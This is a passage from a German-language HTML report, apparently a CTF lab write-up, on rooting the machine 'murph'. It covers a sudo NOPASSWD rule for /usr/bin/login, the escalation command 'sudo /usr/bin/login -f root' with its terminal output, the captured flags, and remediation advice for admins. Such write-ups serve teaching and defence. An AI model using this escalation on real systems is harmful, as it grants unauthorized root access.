+                 <p><strong>Kurzbeschreibung:</strong> Dieser Proof of Concept demonstriert die Erlangung vollständiger Root-Berechtigungen durch die Ausnutzung einer fehlerhaften Sudo-Regel. Der Benutzer <code>pat</code> darf das System-Binary <code>/usr/bin/login</code> als Root ohne Passworteingabe ausführen. Durch die Verwendung des <code>-f</code> Parameters des <code>login</code>-Befehls kann sich der Benutzer <code>pat</code> direkt als der <code>root</code>-Benutzer anmelden, ohne dessen Passwort zu kennen.</p>
+                 <p><strong>Voraussetzungen:</strong></p>
+                 <ul>
+                     <li>Initialer Zugriff als Benutzer <code>pat</code> (erlangt durch vorherige PE von www-data via SUID-Binary zu jen und dann groff -U zu pat).</li>
+                     <li>Existenz einer <code>sudo</code>-Regel, die Benutzer <code>pat</code> erlaubt, <code>/usr/bin/login</code> als Root ohne Passwort auszuführen: <code>(root) NOPASSWD: /usr/bin/login</code>.</li>
+                 </ul>
+                 <p><strong>Schritt-für-Schritt-Anleitung:</strong></p>
+                 <ol>
+                     <li>Erlange eine Shell als Benutzer <code>pat</code>.</li>
+                     <li>Prüfe die <code>sudo</code>-Berechtigungen des Benutzers <code>pat</code> mit <code>sudo -l</code>.</li>
+                     <li>Identifiziere die Regel <code>(root) NOPASSWD: /usr/bin/login</code>.</li>
+                     <li>Führe den folgenden Befehl aus, um sich direkt als Root anzumelden: <code>sudo /usr/bin/login -f root</code>.</li>
+                     <li>Bestätige die Root-Berechtigungen durch Ausführung des <code>id</code>-Befehls in der neuen Shell.</li>
+                 </ol>
+
+                 <p>Der finale Exploit: Von pat zu root</p>
+                 <p>Der Exploit ist so einfach wie genial. login hat einen Parameter -f, der ihm sagt,
+                 er soll einen Benutzer ohne Authentifizierung einloggen.</p>
+
+                <div class="code-block">
+                     <div class="terminal">
+                          <pre><span class="command">pat@murph:/opt$</span> <span class="command">sudo /usr/bin/login -f root</span>
+<span class="command">Linux murph 5.10.0-14-amd64 #1 SMP Debian 5.10.113-1 (2022-04-29) x86_64</span>
+
+<span class="command">The programs included with the Debian GNU/Linux system are free software;</span>
+<span class="command">the exact distribution terms for each program are described in the</span>
+<span class="command">individual files in /usr/share/doc/*/copyright.</span>
+
+<span class="command">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span>
+<span class="command">permitted by applicable law.</span>
+<span class="command">Last login: Tue May 31 11:41:10 CEST 2022 on tty1</span>
+<span class="password">root@murph:~#</span> <span class="command">id</span>
+<span class="password">uid=0(root) gid=0(root) grupos=0(root)</span></pre>
+                     </div>
+                 </div>
+                <p class="analysis"><strong>Analyse:</strong> Mit der gefundenen <code>sudo</code>-Berechtigung <code>(root) NOPASSWD: /usr/bin/login</code> führe ich den Befehl <code>sudo /usr/bin/login -f root</code> aus. Der <code>sudo</code>-Befehl ermöglicht die Ausführung von <code>/usr/bin/login -f root</code> als Root, ohne Passwort. Der Parameter <code>-f</code> (force) des <code>login</code>-Befehls erlaubt die Anmeldung als der angegebene Benutzer (hier 'root') ohne Passwort-Authentifizierung. Die Ausgabe zeigt die standardmäßige Login-Nachricht des Systems, gefolgt von einer neuen Shell mit dem Root-Prompt <code>root@murph:~#</code>. Ich bestätige meine Root-Berechtigungen mit dem Befehl <code>id</code>, der die Ausgabe <code>uid=0(root) gid=0(root) grupos=0(root)</code> zurückgibt. Für Laien: Ich benutze den 'Admin-Befehl' von 'pat' (das 'sudo') und sage ihm, er soll das 'Anmelde-Programm' (login) als 'root' starten und dabei eine spezielle Option ('-f') benutzen, die sagt: 'Melde mich als 'root' an, egal was!'. Und fantastisch – ich habe jetzt das 'Befehlsfenster' des Super-Administrators (root)! Ich habe volle Kontrolle über den Computer. Für Experten: Die erfolgreiche Ausführung von <code>sudo /usr/bin/login -f root</code> ist die direkte und erfolgreiche Ausnutzung der kritischen Sudo-Fehlkonfiguration. Der <code>login -f</code> Parameter in Kombination mit Root-Berechtigungen durch Sudo ermöglicht die Pass-The-Hash oder Pass-The-Ticket-ähnliche Umgehung der Authentifizierung für lokale Logins. Dies führt zur sofortigen Erlangung einer interaktiven Root-Shell. Die <code>id</code>-Ausgabe bestätigt den vollen Systemkompromiss.</p>
+                <p class="evaluation"><strong>Bewertung:</strong> Fantastisch! Der Root-Zugriff wurde erfolgreich über die Sudo-Fehlkonfiguration und das <code>login -f</code> Binary erlangt. Dies ist das Ende der Privilegien-Eskalationskette und der volle Systemkompromiss.</p>
+                <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Mein Ziel ist erreicht. Ich kann nun auf alle Dateien zugreifen, einschließlich der Root-Flag und der User-Flag (die ich zuvor als www-data nicht lesen konnte). Ich werde die Flags auslesen und den Bericht abschließen.<br><strong>Empfehlung (Admin):</strong> Dies ist eine extrem kritische Schwachstelle. Das System hat Root-Rechte verloren. Nehmen Sie das System sofort vom Netz, beheben Sie die unsichere Sudo-Regel für <code>/usr/bin/login</code> umgehend, überprüfen Sie alle anderen Sudo-Regeln und stellen Sie sicher, dass keine Binaries wie <code>login</code> oder <code>su</code> mit NOPASSWD-Optionen für Nicht-Root-Benutzer ausgeführt werden dürfen. Stellen Sie das System von einem sicheren Backup wieder her und implementieren Sie umfassende Sicherheitsmaßnahmen.</p>
+             </section>
+
+             <p><strong>Risikobewertung:</strong></p>
+             <p class="evaluation">Die Kombination aus mehreren Schwachstellen (Upload RCE als www-data, SUID-Binary PE von www-data zu jen, Sudo NOPASSWD für groff PE von jen zu pat, und schließlich Sudo NOPASSWD für login PE von pat zu root) stellt insgesamt ein <strong>kritisches Risiko</strong> dar. Jeder Schritt für sich wäre bereits als moderat bis hoch einzustufen, aber die Kette ermöglichte es einem Angreifer, von einer einfachen Web-Schwachstelle zum vollständigen Systemkompromiss zu gelangen. Insbesondere die Sudo-Fehlkonfigurationen (für groff und login) und das ausnutzbare SUID-Binary sind schwerwiegende Probleme, die die Sicherheit des Systems grundlegend untergraben.</p>
+
+             <p><strong>Empfehlungen zur Behebung:</strong></p>
+             <p class="recommendation"><strong>Empfehlung (Admin):</strong></p>
+             <ul>
+                 <li><strong>Beheben Sie die Datei-Upload-Schwachstelle:</strong> Implementieren Sie strikte Validierung (Whitelist), Bereinigung und Virenscanning für Dateiuploads. Konfigurieren Sie Webserver so, dass Code in Upload-Verzeichnissen nicht ausgeführt wird.</li>
+                 <li><strong>Überprüfen und Entfernen von SUID/SGID-Berechtigungen:</strong> Auditen Sie alle Binaries auf SUID/SGID-Berechtigungen und entfernen Sie diese, wenn sie nicht absolut notwendig sind. Überprüfen Sie benutzerdefinierte SUID-Binaries auf Sicherheitslücken.</li>
+                 <li><strong>Beheben Sie Sudo-Fehlkonfigurationen:</strong> Entfernen Sie die <code>NOPASSWD</code>-Regeln für <code>/usr/bin/groff</code> und insbesondere für <code>/usr/bin/login</code> aus der <code>/etc/sudoers</code> Datei. Wenden Sie das Prinzip der geringsten Rechte an. Erlauben Sie Benutzern nur die Ausführung absolut notwendiger Befehle mit erhöhten Rechten.</li>
+                 <li><strong>Härten Sie Systemprogramme:</strong> Wenn Programme wie <code>groff</code> über <code>sudo</code> ausgeführt werden dürfen, deaktivieren Sie explizit Funktionen zur Ausführung externer Befehle oder schränken Sie die erlaubten Parameter in der <code>sudo</code>-Regel ein.</li>
+                 <li><strong>Strikte Dateiberechtigungen:</strong> Stellen Sie sicher, dass sensible Systemdateien (z.B. <code>/etc/shadow</code>, Benutzer-Home-Verzeichnisse, Sudoers-Datei) korrekte und restriktive Berechtigungen haben.</li>
+                 <li><strong>Umfassende Protokollierung und Überwachung:</strong> Implementieren Sie robuste Protokollierung für Sudo-Aktivitäten, Prozessstarts, Dateizugriffe und Netzwerkverbindungen. Richten Sie Alarme für verdächtige Aktivitäten ein.</li>
+                 <li><strong>Sichere Benutzerverwaltung:</strong> Stellen Sie sicher, dass Passwörter stark sind und nicht wiederverwendet werden. Überprüfen Sie regelmäßig die Mitgliedschaft in privilegierten Gruppen oder die Berechtigungen einzelner Benutzer.</li>
+             </ul>
+
+
+            <div class="code-block">
+                <div class="terminal">
+                     <pre><span class="command">root@murph:~#</span> <span class="command">ls</span>
+<span class="password">root.txt</span>
+<span class="command">root@murph:~#</span> <span class="command">cat root.txt</span>
+<span class="password">HMVRzKuifxeTnsjOpt</span></pre>
+                 </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Nachdem ich Root-Zugriff erlangt habe, ist mein primäres Ziel, die Root-Flag zu finden. Standardmäßig befindet sich die Root-Flag oft im Home-Verzeichnis des Root-Benutzers, also in <code>/root/</code>. Ich befinde mich bereits im Home-Verzeichnis von Root (erkennbar am Prompt <code>root@murph:~#</code>). Ich liste den Inhalt des aktuellen Verzeichnisses mit <code>ls</code> auf. Die Ausgabe zeigt eine Datei namens <code>root.txt</code>. Ich lese den Inhalt dieser Datei mit <code>cat root.txt</code> aus. Die Ausgabe ist die Zeichenkette <code>HMVRzKuifxeTnsjOpt</code>. Für Laien: Ich bin jetzt der 'Chef' (root) und schaue in den Ordner des 'Chefs' (<code>/root/</code>). Dort finde ich eine Datei, die 'root.txt' heißt. Ich schaue mir an, was darin steht, und das ist die 'Geheimnummer' (Flag) für 'root'! Fantastisch! Für Experten: Das Auffinden der Datei <code>root.txt</code> in <code>/root/</code> und das erfolgreiche Auslesen ihres Inhalts (<code>HMVRzKuifxeTnsjOpt</code>) bestätigen die Kompromittierung des Root-Accounts und die Sammlung der Root-Flag. Dies ist ein Standardort für die Root-Flag in CTFs.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Root-Flag wurde erfolgreich gefunden und ausgelesen. Das Hauptziel des Pentests ist erreicht.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die Root-Flag ist gesammelt. Der Test ist abgeschlossen.<br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass sensible Dateien wie Flags sicher gespeichert und nur für autorisierte Benutzer zugänglich sind (im Fall von <code>root.txt</code> sollte nur Root darauf zugreifen können, was hier der Fall war, aber der Root-Account wurde kompromittiert).</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+<span class="command">root@murph:~#</span> <span class="command">ls /home/jen/</span>
+<span class="password">user.txt</span>
+<span class="command">root@murph:~#</span> <span class="command">cat /home/jen/user.txt</span>
+<span class="password">HMVkwXxGPGcaoPNKkH</span></pre>
+                 </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Nachdem ich Root-Rechte habe, kann ich nun auf alle Dateien im System zugreifen, auch auf solche, die ich zuvor als Low-Privilege-Benutzer nicht lesen konnte (wie <code>/home/jen/user.txt</code>). Ich liste den Inhalt des Home-Verzeichnisses von Benutzer <code>jen</code> auf (<code>ls /home/jen/</code>), was die Datei <code>user.txt</code> zeigt. Dann lese ich den Inhalt dieser Datei mit <code>cat /home/jen/user.txt</code> aus. Die Ausgabe ist die Zeichenkette <code>HMVkwXxGPGcaoPNKkH</code>. Für Laien: Da ich jetzt der 'Chef' (root) bin, kann ich auch in den Ordner von 'jen' schauen und die Datei lesen, die ich vorher nicht lesen durfte. Darin finde ich die 'Benutzer-Geheimnummer' (Flag) für 'jen'! Für Experten: Mit Root-Berechtigungen kann ich nun die User-Flag lesen, die ich zuvor als <code>www-data</code> und <code>jen</code> nicht auslesen konnte (aufgrund der <code>-rw-------</code> Berechtigungen, die nur dem Eigentümer jen Leserechte gaben). Das Auslesen von <code>/home/jen/user.txt</code> (<code>HMVkwXxGPGcaoPNKkH</code>) bestätigt die Sammlung der User-Flag.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die User-Flag wurde erfolgreich gefunden und ausgelesen. Damit sind beide Flags gesammelt und die Ziele des Pentests erreicht.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Beide Flags sind gesammelt. Der Pentest ist abgeschlossen.<br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass Benutzer-Home-Verzeichnisse mit strikten Berechtigungen versehen sind (nur für den Eigentümer lesbar/schreibbar), um die Offenlegung von Daten zu verhindern, falls ein anderer Low-Privilege-Benutzer kompromittiert wird (obwohl Root dies umgehen kann).</p>
+
+        </section>
+
+        <section id="flags">
+            <div class="flag-container">
+                <h2 class="flag-heading">Flags</h2>
+                <!-- Einzelne Flags werden hier im korrigierten Format eingefügt -->
+                <div class="flag-entry">
+                    <div class="flag-command">cat /home/jen/user.txt</div>
+                    <div class="flag-value"><span class="password">HMVkwXxGPGcaoPNKkH</span></div>
+                </div>
+                <div class="flag-entry">
+                    <div class="flag-command">cat root.txt</div>
+                    <div class="flag-value"><span class="password">HMVRzKuifxeTnsjOpt</span></div>
+                </div>
+            </div>
+        </section>
+
+
+    </div> <!-- Ende container -->
+
+    <footer class="footer">
+        <p>Ben Cyber Security Reports</p>
+        <p>Berichtsdatum: 16. Juni 2025</p>
+    </footer>
+
+</body>
+</html>
